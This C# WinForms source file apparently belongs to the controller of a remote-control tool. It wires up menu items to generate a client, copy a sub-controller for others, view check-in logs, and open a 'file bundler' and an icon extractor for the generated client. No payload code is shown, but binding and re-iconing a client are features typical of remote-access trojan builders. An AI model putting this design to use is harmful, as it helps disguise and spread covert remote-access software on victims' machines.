using System;
using System.IO;
using System.Windows.Forms;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private void AddControllerContextMenuItems()
        {
            var menuController = new ToolStripMenuItem("控制端(&C)");
            menuController.DropDownItems.Add("返回主机列表(&H)", null, onMenuShowDashboardHome);
            menuController.DropDownItems.Add("刷新主机列表(&R)", null, onMenuRefreshHosts);
            menuController.DropDownItems.Add("连接/断开Relay(&L)", null, onMenuToggleRelay);
            menuController.DropDownItems.Add(new ToolStripSeparator());
            menuController.DropDownItems.Add("生成客户端(&G)", null, onMenuGenerateClient);
            menuController.DropDownItems.Add("配置程序(&S)", null, onMenuOpenSettings);
            menuController.DropDownItems.Add("生成副控端(&P)", null, onMenuGenerateSubController);
            menuController.DropDownItems.Add(new ToolStripSeparator());
            menuController.DropDownItems.Add("上线日志查看器(&O)", null, onMenuOnlineLogViewer);
            menuController.DropDownItems.Add("文件捆绑器(&B)", null, onMenuFileBundler);
            menuController.DropDownItems.Add("图标提取器(&I)", null, onMenuSelectIcon);
            menuController.DropDownItems.Add(new ToolStripSeparator());
            menuController.DropDownItems.Add("客户需求覆盖报告(&D)", null, onMenuShowCustomerCoverage);
            contextMenuStripClient.Items.Add(menuController);
        }

        private void onMenuShowDashboardHome(object sender, EventArgs e)
        {
            ShowDashboardHome();
        }

        private void onMenuRefreshHosts(object sender, EventArgs e)
        {
            if (RSCApplication.oRemoteControlServer != null)
                RSCApplication.oRemoteControlServer.RefreshClientList();
            ScheduleClientListRefresh();
            RefreshHostDashboard();
            doOutput("已刷新主机列表");
        }

        private void onMenuToggleRelay(object sender, EventArgs e)
        {
            toolStripButton4_Click(this.toolStripButton4, EventArgs.Empty);
        }

        private void onMenuGenerateClient(object sender, EventArgs e)
        {
            using (var frm = new FrmSettings())
            {
                frm.Owner = this;
                frm.GenerateClient();
            }
        }

        private void onMenuOpenSettings(object sender, EventArgs e)
        {
            toolStripButtonSettings_Click(this, EventArgs.Empty);
        }

        private void onMenuGenerateSubController(object sender, EventArgs e)
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string subExe = Path.Combine(baseDir, "RemoteControl.SubController.exe");
            string subProtocals = Path.Combine(baseDir, "RemoteControl.Protocals.dll");

            // Check if SubController files exist in current directory
            if (!File.Exists(subExe))
            {
                // Try the build output directory
                string slnDir = Path.GetDirectoryName(Path.GetDirectoryName(baseDir.TrimEnd('\\')));
                string buildDir = Path.Combine(slnDir, "RemoteControl.SubController", "bin", "Debug");
                subExe = Path.Combine(buildDir, "RemoteControl.SubController.exe");
                subProtocals = Path.Combine(buildDir, "RemoteControl.Protocals.dll");
            }

            if (!File.Exists(subExe))
            {
                MessageBox.Show("找不到副控端文件 RemoteControl.SubController.exe\n"
                    + "请先编译 RemoteControl.SubController 项目。",
                    "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            using (var dlg = new FolderBrowserDialog())
            {
                dlg.Description = "选择副控端文件输出目录";
                if (dlg.ShowDialog() != DialogResult.OK)
                    return;

                string outDir = dlg.SelectedPath;
                try
                {
                    // Copy SubController exe and dependencies
                    File.Copy(subExe, Path.Combine(outDir, "RemoteControl.SubController.exe"), true);
                    CopyIfExists(subProtocals, Path.Combine(outDir, "RemoteControl.Protocals.dll"));
                    CopyIfExists(Path.Combine(Path.GetDirectoryName(subExe), "Newtonsoft.Json.Lite.dll"),
                        Path.Combine(outDir, "Newtonsoft.Json.Lite.dll"));
                    CopyIfExists(Path.Combine(Path.GetDirectoryName(subExe), "log4net.dll"),
                        Path.Combine(outDir, "log4net.dll"));

                    MessageBox.Show("副控端已生成到：\n" + outDir
                        + "\n\n将整个文件夹发给对方即可使用。",
                        "生成副控端", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("生成失败：" + ex.Message,
                        "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private static void CopyIfExists(string src, string dest)
        {
            if (File.Exists(src))
                File.Copy(src, dest, true);
        }

        private void onMenuOnlineLogViewer(object sender, EventArgs e)
        {
            string logDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "logs");
            var frm = new FrmOnlineLogViewer(logDir);
            frm.Show();
        }

        private void onMenuFileBundler(object sender, EventArgs e)
        {
            string clientExe = Path.Combine(
                AppDomain.CurrentDomain.BaseDirectory,
                "RemoteControl.Client.Generated.exe");
            FileBundler.ShowBundleDialog(clientExe);
        }

        private void onMenuSelectIcon(object sender, EventArgs e)
        {
            var frm = new FrmSelectIcon();
            frm.Show();
        }
    }
}
